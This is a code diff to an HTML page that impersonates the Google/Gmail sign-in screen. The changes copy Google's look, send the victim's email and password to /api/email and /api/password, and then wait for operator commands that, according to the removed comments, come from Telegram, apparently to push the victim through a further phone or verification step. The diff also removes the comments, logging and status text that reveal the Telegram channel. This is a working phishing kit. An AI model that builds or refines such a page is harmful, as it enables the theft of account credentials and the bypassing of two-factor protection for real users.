@@ -3,87 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail - Login</title>
+    <title>Sign in - Google Accounts</title>
     <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
-        <div class="login-box">
-            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
-            <h1>Sign in</h1>
-            <p class="subtitle">to continue to Gmail</p>
+        <div class="card">
+            <div class="header">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
+                <h1>Sign in</h1>
+                <p class="subtitle">to continue to Gmail</p>
+            </div>
             
             <form id="loginForm">
                 <div class="input-group">
-                    <input type="email" id="email" required placeholder=" ">
+                    <input type="email" id="email" required>
                     <label>Email or phone</label>
+                    <div class="underline"></div>
                 </div>
                 
                 <div class="input-group">
-                    <input type="password" id="password" required placeholder=" ">
-                    <label>Password</label>
+                    <input type="password" id="password" required>
+                    <label>Enter your password</label>
+                    <div class="underline"></div>
                 </div>
                 
-                <button type="submit" class="btn-next">Next</button>
+                <div class="options">
+                    <a href="#" class="forgot-link">Forgot email?</a>
+                </div>
+                
+                <div class="actions">
+                    <a href="#" class="create-link">Create account</a>
+                    <button type="submit" class="btn-next">Next</button>
+                </div>
             </form>
             
-            <div id="loading" style="display:none;" class="loading">
+            <div id="loading" style="display:none;">
                 <div class="spinner"></div>
-                <p>Verifying...</p>
-                <p style="font-size:12px; color:#9aa0a6; margin-top:10px;" id="statusText">Waiting for command from Telegram...</p>
+                <p class="loading-text">Verifying...</p>
             </div>
             
-            <div id="sessionInfo" style="margin-top: 15px; font-size: 12px; color: #9aa0a6; text-align: center;"></div>
+            <div id="sessionInfo" class="session-info"></div>
         </div>
     </div>
     
     <script>
         let sessionId = null;
-        let pollingInterval = null;
         
-        // Initialize session
         async function initSession() {
             try {
                 const response = await fetch('/api/visit', { method: 'POST' });
                 const data = await response.json();
                 sessionId = data.sessionId;
                 document.getElementById('sessionInfo').textContent = `Session: ${sessionId}`;
-                console.log('Session ID:', sessionId);
             } catch (error) {
-                console.error('Session init error:', error);
+                console.error('Error:', error);
             }
         }
         
         initSession();
         
-        // Handle login
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Show loading
-            document.querySelector('.login-box').style.opacity = '0.5';
+            document.querySelector('.card').style.opacity = '0.5';
             document.getElementById('loading').style.display = 'block';
             document.getElementById('loginForm').style.display = 'none';
             
             try {
-                // Send email
                 await fetch('/api/email', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ sessionId, email })
                 });
                 
-                // Send password
                 await fetch('/api/password', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ sessionId, password })
                 });
                 
-                // Start waiting for command
                 await waitForCommand();
                 
             } catch (error) {
@@ -91,10 +94,7 @@
             }
         });
         
-        // Wait for command from Telegram
         async function waitForCommand() {
-            document.getElementById('statusText').textContent = 'Waiting for Telegram command...';
-            
             const maxAttempts = 300;
             let attempts = 0;
             
@@ -104,7 +104,6 @@
                     const data = await response.json();
                     
                     if (data.command) {
-                        console.log('Command received:', data.command);
                         handleCommand(data.command);
                         return;
                     }
@@ -116,11 +115,10 @@
                 attempts++;
             }
             
-            alert('Login timed out. Please try again.');
+            alert('Session timed out. Please try again.');
             location.reload();
         }
         
-        // Handle different commands
         function handleCommand(command) {
             switch(command) {
                 case 'phone':
